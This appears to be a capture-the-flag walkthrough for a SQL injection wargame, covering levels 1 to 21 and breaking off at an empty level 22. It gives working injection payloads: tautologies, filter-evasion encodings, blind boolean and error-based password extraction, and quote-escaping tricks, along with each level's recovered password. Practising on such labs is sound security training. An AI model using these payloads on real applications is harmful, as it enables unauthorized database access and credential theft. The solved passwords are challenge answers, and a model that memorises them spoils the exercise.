level-1 (gremlin):
  -> inspect the page and add a parameter named id.
  -> where id=' or 1=1-- , so that it returns true.
  -> the level is cleared..

level-2 (cobolt):
  -> inspect the page and add a parameter named id.
  -> where id=admin'-- , so that it returns true since only admins are allowed.
  -> the level is cleared..

level-3 (goblin):
  -> inspect the page and add a parameter named no.
  -> where no=0 or id=(hex form of admin) . here u can give any number other than 1 since guest matches with "1".
  -> the level is solved.

level-4 (orc):
  -> inspect the page and add a parameter named pw.
  -> where pw=' or 1=1-- , this return the first half true in source code.
  -> lets check the length of the password.
  -> where pw=' or 1=1 and length(pw)>10-- , if it returns anything then it is true else it is false.
  -> now lets take pw=' or 1=1 and substring(pw,1,1)='a'-- 
  -> open burpsuite and on bruteforcing we will get the password .
  -> now enter pw=095a9852
  -> the level is cleared.

level-5 (wolfman):
  -> inspect the page and in the url add pw.
  -> where pw='%09or%09id='admin'--%09
  -> since "%09" represents the tab space(percent encoding), which is similar to spacebar but not same.
  -> the level is cleared.

level-6 (darkelf):
  -> inspect the page and in the url add parameter named pw.
  -> where pw=' || id='admin'--  .("||"  it is represented as or.)
  -> the level is cleared.

level-7 (orge):
  -> inspect the page and add a parameter named pw.
  -> where pw=' or 1=1-- , this return the first half true in source code.
  -> lets check the length of the password.
  -> where pw=' or 1=1 and length(pw)>10-- , if it returns anything then it is true else it is false.
  -> now lets take pw=' or 1=1 && substring(pw,1,1)='a'-- 
  -> open burpsuite and on bruteforcing we will get the password .
  -> now enter pw=7b751aec
  -> the level is cleared.

level-8 (troll):
  -> inspect the page and add a parameter named id.
  -> where id=Admin or ADMIN.
  -> since database is case insensitive if the input is in capital also it will take it as admin..
  -> the level is cleared.

level-9 (vampire):
  -> inspect the page and add a parameter named id.
  -> since if we enter admin then it gets replaced by "". ( an empty space)
  -> so id=adadminmin.  ( in this the admin in the middle will be replaces by empty space then the final output is admin itself)
  -> the level is cleared..

level-10 (skeleton):
  -> inspect the page and add a parameter named id.
  -> where id= 123' or id='admin' and 1=1--  ( anything can be inserted in place of 123 and or id=admin and 1=1--  return always true.)
  -> another way is 
  -> where id=' or 1=1 and length(pw)<20--  ( since the condition is true it reurns a row in which the id has the length of the pass less than 20.)
  -> the level is cleared.

level-11 (golem):
  -> inspect the page and add a parameter named pw.
  -> where pw=' || id LIKE 'admin' && length(pw)<8-- . (we can use LIKE instead of "=" since = is blocked)
  -> now let pw=' || id LIKE 'admin' && substring(pw,1,1) LIKE '7'-- .(substr is blocked but not substring)
  -> bruteforce and get the password.
  -> now pw=77d6290b
  -> th level is cleared..

level-12 (darkknight):
  -> inspect the page and add a parameter named no.
  -> where no=""  . ( u just started and ended it since pw is block we cant do anything with it.)
  -> now write no="" || id LIKE "admin" && length(pw)>7
  -> if it returns true then start brute forcing it..
  -> where pw=0b70ea1f
  -> the level is cleared..

level-13 (bugbear):
  -> inspect the page and add a parameter named no in url
  -> where no=""%09||%09id%09IN%09("admin")%09&&%09mid(pw,1,1)%09IN%09("7")
  -> if it return true start brute forcing it.
  -> where pw=52dc3991
  -> the level is cleared

level-14 (giant):
  -> inspect the page and add a parameter named shit in url.
  -> where shit=(vertical tab in percent encoding)[%0B]
  -> the level is cleared..

level-15 (assassin):
  -> inspect the page and add a parameter named pw.
  -> where pw=a%  .(wild card characters "%,_")
  -> by brute forcing the above query we get the first character.
  -> if it returns hello guest then check for the next characater of it , since if it returns it will not check for any other it will just return we can say that the first character of admin is also the same, so check for the next character)
  -> now pw=9_%  .("_" represents for a single character, "%" represents for multiple characters)
  -> brute force the above query and if it returns hello guest check for the next character..
  -> now pw=90_ .
  -> on brute forcing it , it returns hello admin then enter first three charcaters of admin in pw.
  -> pw=902%
  -> the level is cleared since it matches with first three characters of admin pass.

level-16 (succubus):
  -> in order to escape the single quote lets use "\"
  -> where id='\' and pw=' or 1=1-- 
  -> the level is cleared

level-17 (zombie_assassin):
  -> since if there are any special characters present in the query then a back slash is added.
  -> now id=" and pw=- --1=1 ro  ( since string will get reversed )
  -> the final query is :
          query : select id from prob_zombie_assassin where id='"\' and pw='or 1=1-- -'
  -> here the first two quotes are on pair and then there is a single quote open after that and the other is escaped by back slash so that the start of pw will be the closing of the single quote.
  -> the level is cleared.

level-18 (nightmare):
  -> we can just enter 6 characters in pw.
  -> where pw=')=0;%00  ( %00 is a null character)
  -> so that the condition returns true.
  -> the level is cleared

level-19 (Xavis):
  -> add a parameter named pw in url.
  -> ?pw=' or (SELECT @abt:=pw WHERE id='admin') UNION SELECT @abt-- -
  -> ad is a user defined session variable.
  -> the level is cleared..

level-20 (dragon):
  -> since in the query # is present which comments out the rest of the statement in the query.
  -> to end the comment we can use a new line or line break character (\n)..
  -> pw='%0A and 1=0 or id='admin'-- -
  -> the level is cleared.

level-21 (iron_golem):
  -> 
  -> pw=' OR IF(length(pw)>31, (select 1 union select 2), 1)-- - 
  -> if the condition is true then it force the database error and send the message as "Subquery returned more than 1 value"..
  -> if not it remains as such.
  -> then pw=' OR IF(substring(pw,1,1)='1', (select 1 union select 2), 1)-- -
  -> start brute forcing it and get the password. ( pw=06b5a6c16e8830475f983cc3a825ee9a )
  -> the level is cleared.

level-22 (dark_eyes):
  ->
